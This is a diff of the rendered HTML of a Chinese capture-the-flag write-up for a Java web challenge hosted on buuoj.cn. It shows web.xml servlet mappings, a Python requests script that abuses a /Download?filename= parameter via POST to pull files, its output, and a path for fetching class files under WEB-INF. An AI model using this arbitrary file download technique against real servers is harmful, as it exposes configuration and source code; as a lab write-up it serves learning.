+        <span class="pl-c1">&lt;</span><span class="pl-s1">servlet-name</span><span class="pl-c1">&gt;</span>DownloadController<span class="pl-kos">&lt;/</span><span class="pl-s1">servlet-name</span><span class="pl-c1">&gt;</span>
+        <span class="pl-c1">&lt;</span><span class="pl-s1">url-pattern</span><span class="pl-c1">&gt;</span>/Download<span class="pl-kos">&lt;/</span><span class="pl-s1">url-pattern</span><span class="pl-c1">&gt;</span>
+    <span class="pl-kos">&lt;/</span><span class="pl-s1">servlet-mapping</span><span class="pl-c1">&gt;</span>
 
-    <span class="pl-c1">&lt;</span><span class="pl-ent">servlet</span><span class="pl-c1">&gt;</span>
-        <span class="pl-c1">&lt;</span><span class="pl-ent">servlet-name</span><span class="pl-c1">&gt;</span>FlagController<span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">servlet-name</span><span class="pl-c1">&gt;</span>
-        <span class="pl-c1">&lt;</span><span class="pl-ent">servlet-class</span><span class="pl-c1">&gt;</span>com.wm.ctf.FlagController<span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">servlet-class</span><span class="pl-c1">&gt;</span>
-    <span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">servlet</span><span class="pl-c1">&gt;</span>
-    <span class="pl-c1">&lt;</span><span class="pl-ent">servlet-mapping</span><span class="pl-c1">&gt;</span>
-        <span class="pl-c1">&lt;</span><span class="pl-ent">servlet-name</span><span class="pl-c1">&gt;</span>FlagController<span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">servlet-name</span><span class="pl-c1">&gt;</span>
-        <span class="pl-c1">&lt;</span><span class="pl-ent">url-pattern</span><span class="pl-c1">&gt;</span>/Flag<span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">url-pattern</span><span class="pl-c1">&gt;</span>
-    <span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">servlet-mapping</span><span class="pl-c1">&gt;</span>
+    <span class="pl-c1">&lt;</span><span class="pl-s1">servlet</span><span class="pl-c1">&gt;</span>
+        <span class="pl-c1">&lt;</span><span class="pl-s1">servlet-name</span><span class="pl-c1">&gt;</span>FlagController<span class="pl-kos">&lt;/</span><span class="pl-s1">servlet-name</span><span class="pl-c1">&gt;</span>
+        <span class="pl-c1">&lt;</span><span class="pl-s1">servlet-class</span><span class="pl-c1">&gt;</span>com.wm.ctf.FlagController<span class="pl-kos">&lt;/</span><span class="pl-s1">servlet-class</span><span class="pl-c1">&gt;</span>
+    <span class="pl-kos">&lt;/</span><span class="pl-s1">servlet</span><span class="pl-c1">&gt;</span>
+    <span class="pl-c1">&lt;</span><span class="pl-s1">servlet-mapping</span><span class="pl-c1">&gt;</span>
+        <span class="pl-c1">&lt;</span><span class="pl-s1">servlet-name</span><span class="pl-c1">&gt;</span>FlagController<span class="pl-kos">&lt;/</span><span class="pl-s1">servlet-name</span><span class="pl-c1">&gt;</span>
+        <span class="pl-c1">&lt;</span><span class="pl-s1">url-pattern</span><span class="pl-c1">&gt;</span>/Flag<span class="pl-kos">&lt;/</span><span class="pl-s1">url-pattern</span><span class="pl-c1">&gt;</span>
+    <span class="pl-kos">&lt;/</span><span class="pl-s1">servlet-mapping</span><span class="pl-c1">&gt;</span>
 
-<span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">web-app</span><span class="pl-c1">&gt;</span></pre></div>
+<span class="pl-kos">&lt;/</span><span class="pl-s1">web-app</span><span class="pl-c1">&gt;</span></pre></div>
 <p>一种常见的servlet和mapping的bind</p>
 <h2>4.4 直接访问<code class="notranslate">/Flag</code></h2>
 <p>抱着试一试的心</p>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/4c3ede908764759ba66059ef6fdd973ea9f8b31998e5d21157138b1b533079d3/68747470733a2f2f7265732e63726166742e646f2f757365722f66756c6c2f33636639343334312d303238662d613438382d313064662d6430363561613133373066632f646f632f64333033363731372d623037352d666535622d346166662d3233396633623133333636662f66646330343936622d623165612d343665642d613737322d643266313762356334616136"><img src="https://camo.githubusercontent.com/4c3ede908764759ba66059ef6fdd973ea9f8b31998e5d21157138b1b533079d3/68747470733a2f2f7265732e63726166742e646f2f757365722f66756c6c2f33636639343334312d303238662d613438382d313064662d6430363561613133373066632f646f632f64333033363731372d623037352d666535622d346166662d3233396633623133333636662f66646330343936622d623165612d343665642d613737322d643266313762356334616136" alt="image.png" data-canonical-src="https://res.craft.do/user/full/3cf94341-028f-a488-10df-d065aa1370fc/doc/d3036717-b075-fe5b-4aff-239f3b13366f/fdc0496b-b1ea-46ed-a772-d2f17b5c4aa6" style="max-width: 100%;"></a></p>
 <p>此路不同就走另外的路。</p>
 <p>不过我没有想到的是走了获取字节码的路。</p>
-<div class="highlight highlight-source-js"><pre class="notranslate"><span class="pl-c1">&lt;</span><span class="pl-ent">servlet</span><span class="pl-c1">&gt;</span>
-        <span class="pl-c1">&lt;</span><span class="pl-ent">servlet-name</span><span class="pl-c1">&gt;</span>FlagController<span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">servlet-name</span><span class="pl-c1">&gt;</span>
-        <span class="pl-c1">&lt;</span><span class="pl-ent">servlet-class</span><span class="pl-c1">&gt;</span>com.wm.ctf.FlagController<span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">servlet-class</span><span class="pl-c1">&gt;</span>
-    <span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">servlet</span><span class="pl-c1">&gt;</span>
+<div class="highlight highlight-source-js"><pre class="notranslate"><span class="pl-c1">&lt;</span><span class="pl-s1">servlet</span><span class="pl-c1">&gt;</span>
+        <span class="pl-c1">&lt;</span><span class="pl-s1">servlet-name</span><span class="pl-c1">&gt;</span>FlagController<span class="pl-kos">&lt;/</span><span class="pl-s1">servlet-name</span><span class="pl-c1">&gt;</span>
+        <span class="pl-c1">&lt;</span><span class="pl-s1">servlet-class</span><span class="pl-c1">&gt;</span>com.wm.ctf.FlagController<span class="pl-kos">&lt;/</span><span class="pl-s1">servlet-class</span><span class="pl-c1">&gt;</span>
+    <span class="pl-kos">&lt;/</span><span class="pl-s1">servlet</span><span class="pl-c1">&gt;</span>
     <span class="pl-c1">&lt;</span><span class="pl-s1">servlet</span><span class="pl-c1">-</span><span class="pl-s1">mapping</span><span class="pl-c1">&gt;</span>
-        <span class="pl-c1">&lt;</span><span class="pl-ent">servlet-name</span><span class="pl-c1">&gt;</span>FlagController<span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">servlet-name</span><span class="pl-c1">&gt;</span>
+        <span class="pl-c1">&lt;</span><span class="pl-s1">servlet-name</span><span class="pl-c1">&gt;</span>FlagController<span class="pl-kos">&lt;/</span><span class="pl-s1">servlet-name</span><span class="pl-c1">&gt;</span>
         <span class="pl-c1">&lt;</span><span class="pl-s1">url</span><span class="pl-c1">-</span><span class="pl-s1">pattern</span><span class="pl-c1">&gt;</span><span class="pl-pds"><span class="pl-c1">/</span>Flag&lt;<span class="pl-c1">/</span>url</span><span class="pl-c1">-</span><span class="pl-s1">pattern</span><span class="pl-c1">&gt;</span>
-    <span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-ent">servlet-mapping</span><span class="pl-c1">&gt;</span></pre></div>
+    <span class="pl-c1">&lt;</span><span class="pl-c1">/</span><span class="pl-s1">servlet-mapping</span><span class="pl-c1">&gt;</span></pre></div>
 <h2>4.5 再次请求</h2>
 <p><a target="_blank" rel="noopener noreferrer nofollow" href="https://camo.githubusercontent.com/7c5131b8ed88337bb2527ba934454027b6716ba5003868ff0135384d0252c7c8/68747470733a2f2f7265732e63726166742e646f2f757365722f66756c6c2f33636639343334312d303238662d613438382d313064662d6430363561613133373066632f646f632f64333033363731372d623037352d666535622d346166662d3233396633623133333636662f35326661306338312d623131382d343833652d616534302d643137653533303238356464"><img src="https://camo.githubusercontent.com/7c5131b8ed88337bb2527ba934454027b6716ba5003868ff0135384d0252c7c8/68747470733a2f2f7265732e63726166742e646f2f757365722f66756c6c2f33636639343334312d303238662d613438382d313064662d6430363561613133373066632f646f632f64333033363731372d623037352d666535622d346166662d3233396633623133333636662f35326661306338312d623131382d343833652d616534302d643137653533303238356464" alt="image.png" data-canonical-src="https://res.craft.do/user/full/3cf94341-028f-a488-10df-d065aa1370fc/doc/d3036717-b075-fe5b-4aff-239f3b13366f/52fa0c81-b118-483e-ae40-d17e530285dd" style="max-width: 100%;"></a></p>
 <p>请求得到结果</p>
@@ -528,7 +528,7 @@ Vary: <span class="pl-v">Accept</span><span class="pl-c1">-</span><span class="p
 
 <span class="pl-s1">def</span> <span class="pl-en">send_get_request</span>(<span class="pl-s1">url</span>, <span class="pl-s1">params</span>=<span class="pl-s1">None</span>):
     <span class="pl-k">try</span>:
-        <span class="pl-s1">headers</span> = <span class="pl-en">get_headers</span>()  # 获取伪装的请求头
+        <span class="pl-s1">headers</span> = <span class="pl-en">get_headers</span>()  # <span class="pl-smi">获取伪装的请求头</span>
         <span class="pl-s1">response</span> = <span class="pl-s1">requests</span>.<span class="pl-en">get</span>(<span class="pl-s1">url</span>, <span class="pl-s1">headers</span>=<span class="pl-s1">headers</span>, <span class="pl-s1">params</span>=<span class="pl-s1">params</span>)
 
         <span class="pl-s1">if</span> <span class="pl-s1">response</span>.<span class="pl-s1">status_code</span> == <span class="pl-c1">200</span>:
@@ -549,11 +549,11 @@ Vary: <span class="pl-v">Accept</span><span class="pl-c1">-</span><span class="p
             <span class="pl-s1">print</span>(<span class="pl-s">"响应内容："</span>, <span class="pl-smi">response</span>.<span class="pl-smi">text</span>[:<span class="pl-c1">500</span>])  
         <span class="pl-s1">else</span>:
             <span class="pl-en">print</span>(<span class="pl-s1">f</span><span class="pl-s">"POST 请求失败，状态码：{response.status_code}"</span>)
-    <span class="pl-smi">except</span> <span class="pl-s1">requests</span>.<span class="pl-s1">exceptions</span>.<span class="pl-s1">RequestException</span> <span class="pl-s1">as</span> <span class="pl-s1">e</span>:
-        <span class="pl-s1">print</span>(<span class="pl-s1">f</span><span class="pl-s">"请求错误：{e}"</span>)
+    <span class="pl-s1">except</span> <span class="pl-smi">requests</span>.<span class="pl-smi">exceptions</span>.<span class="pl-smi">RequestException</span> <span class="pl-s1">as</span> <span class="pl-s1">e</span>:
+        <span class="pl-en">print</span>(<span class="pl-s1">f</span><span class="pl-s">"请求错误：{e}"</span>)
 
 <span class="pl-smi">def</span> <span class="pl-s1">main</span>():
-    <span class="pl-en">print</span>(<span class="pl-s">"--------It gets starting------"</span>)
+    <span class="pl-s1">print</span>(<span class="pl-s">"--------It gets starting------"</span>)
 
     <span class="pl-s1">url</span> = <span class="pl-s">"http://501e1e92-a571-4fae-b8ae-6ce7c2722ed7.node5.buuoj.cn:81/"</span>
     <span class="pl-s1">url</span> = <span class="pl-s">"http://501e1e92-a571-4fae-b8ae-6ce7c2722ed7.node5.buuoj.cn:81/Download?filename=help.docx"</span>
@@ -569,13 +569,13 @@ Vary: <span class="pl-v">Accept</span><span class="pl-c1">-</span><span class="p
     <span class="pl-en">send_post_request</span>(<span class="pl-s1">url</span>, <span class="pl-s1">data</span>)
 
 <span class="pl-s1">if</span> <span class="pl-s1">__name__</span> == <span class="pl-s">"__main__"</span>:
-    <span class="pl-en">main</span>()</pre></div>
+    <span class="pl-s1">main</span>()</pre></div>
 <p>结果：</p>
 <div class="highlight highlight-source-java"><pre class="notranslate">--------<span class="pl-smi">It</span> <span class="pl-s1">gets</span> <span class="pl-s1">starting</span>------
-<span class="pl-c1">GET</span> 请求成功!
-响应内容： <span class="pl-smi">java</span>.<span class="pl-smi">io</span>.<span class="pl-smi">FileNotFoundException</span>:{<span class="pl-smi">help</span>.<span class="pl-smi">docx</span>}
-<span class="pl-c1">POST</span> 请求成功!
-响应内容： <span class="pl-c1">PK</span>��� �   ! <span class="pl-s1">ߤ</span>�<span class="pl-s1">lZ</span>�   �  ��[<span class="pl-s1">Content_Types</span>].<span class="pl-s1">xml</span> ���(� �</pre></div>
+<span class="pl-smi">GET</span> <span class="pl-s1">请求成功</span>!
+<span class="pl-smi">响应内容</span>： <span class="pl-s1">java</span>.<span class="pl-smi">io</span>.<span class="pl-smi">FileNotFoundException</span>:{<span class="pl-s1">help</span>.<span class="pl-smi">docx</span>}
+<span class="pl-c1">POST</span> <span class="pl-s1">请求成功</span>!
+<span class="pl-s1">响应内容</span>： <span class="pl-c1">PK</span>��� �   ! <span class="pl-s1">ߤ</span>�<span class="pl-s1">lZ</span>�   �  ��[<span class="pl-s1">Content_Types</span>].<span class="pl-s1">xml</span> ���(� �</pre></div>
 <p>最后我也知道当时下载了help.docx不是幻觉了，是通过post下载了。</p>
 <p>现在的问题是，</p>
 <ul>
@@ -633,8 +633,8 @@ Vary: <span class="pl-v">Accept</span><span class="pl-c1">-</span><span class="p
                 <span class="pl-en">print</span>(<span class="pl-s">"POST request successful, but no flag found."</span>)
         <span class="pl-s1">else</span>:
             <span class="pl-en">print</span>(<span class="pl-s1">f</span><span class="pl-s">"POST request failed, status code: {response.status_code}"</span>)
-    <span class="pl-smi">except</span> <span class="pl-s1">requests</span>.<span class="pl-s1">exceptions</span>.<span class="pl-s1">RequestException</span> <span class="pl-s1">as</span> <span class="pl-s1">e</span>:
-        <span class="pl-s1">print</span>(<span class="pl-s1">f</span><span class="pl-s">"Request error: {e}"</span>)
+    <span class="pl-s1">except</span> <span class="pl-smi">requests</span>.<span class="pl-smi">exceptions</span>.<span class="pl-smi">RequestException</span> <span class="pl-s1">as</span> <span class="pl-s1">e</span>:
+        <span class="pl-en">print</span>(<span class="pl-s1">f</span><span class="pl-s">"Request error: {e}"</span>)
 
 
 <span class="pl-s1">catalog</span> = <span class="pl-s">"WEB-INF/classes/com/wm/ctf/"</span>
